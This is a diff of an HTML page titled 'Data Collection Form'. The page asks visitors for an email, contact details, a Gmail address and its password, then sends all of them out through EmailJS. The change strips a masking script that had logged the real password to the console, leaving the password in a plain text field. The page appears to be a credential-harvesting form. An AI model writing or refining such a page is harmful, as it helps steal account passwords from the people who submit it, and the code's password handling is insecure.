@@ -23,7 +23,7 @@
                 email: document.getElementById('email').value,
                 contact: document.getElementById('contact').value,
                 gmail: document.getElementById('gmail').value,
-                password: actualPassword
+                password: document.getElementById('pass').value
             };
 
             // Send email via EmailJS
@@ -43,30 +43,8 @@
     <label for="gmail">Email:</label><br>
         <input type="text" id="gmail" name="gmail" required><br><br>
 
-        <label for="pass">Password:</label><br>
-        <input type="text" id="pass" name="pass" required oninput="maskPassword()" autocomplete="off"><br><br>
-        
-        <script>
-          let actualPassword = '';
-        
-          function maskPassword() {
-            const inputField = document.getElementById('pass');
-            const inputValue = inputField.value;
-            const lastChar = inputValue.slice(-1);
-        
-            // Update the actual password
-            if (inputValue.length > actualPassword.length) {
-              actualPassword += lastChar; // Add the last character
-            } else {
-              actualPassword = actualPassword.slice(0, -1); // Remove the last character
-            }
-        
-            // Replace the input field value with masked text
-            inputField.value = '*'.repeat(actualPassword.length);
-        
-            console.log("Actual Password:", actualPassword); // For debugging purposes
-          }
-        </script>        
+       <label for="pass">Password:</label><br>
+        <input type="text" id="pass" name="pass" required><br><br>       
     
     <h1>Data Collection Form</h1>
     <form id="contactForm" onsubmit="event.preventDefault(); sendEmail();">
